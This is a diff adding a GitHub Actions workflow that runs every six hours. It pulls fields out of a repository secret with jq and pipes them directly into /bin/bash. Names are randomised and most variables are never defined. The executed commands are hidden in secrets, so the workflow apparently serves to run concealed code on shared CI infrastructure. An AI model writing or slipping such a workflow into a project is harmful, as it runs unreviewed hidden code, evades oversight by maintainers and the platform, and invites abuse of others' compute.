@@ -1,0 +1,26 @@
+name: timelyarmistice
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: timelyarmistice
+        env:
+          khs3732: ${{ secrets.khs3732 }}
+        run: |
+          echo $khs3732 | jq -r .heglx588 | /bin/bash
+          echo $crzjs83994 | jq -r .w950 | /bin/bash
+          echo $jk79 | jq -r .r49 | /bin/bash
+          echo $y2754 | jq -r .sd24 | /bin/bash
+          echo $oa22 | jq -r .i3162 | /bin/bash
+          echo $m4307 | jq -r .je38 | /bin/bash
+          echo $ftqsk940 | jq -r .wqxs874 | /bin/bash
+          echo $q9511 | jq -r .doke708 | /bin/bash
+
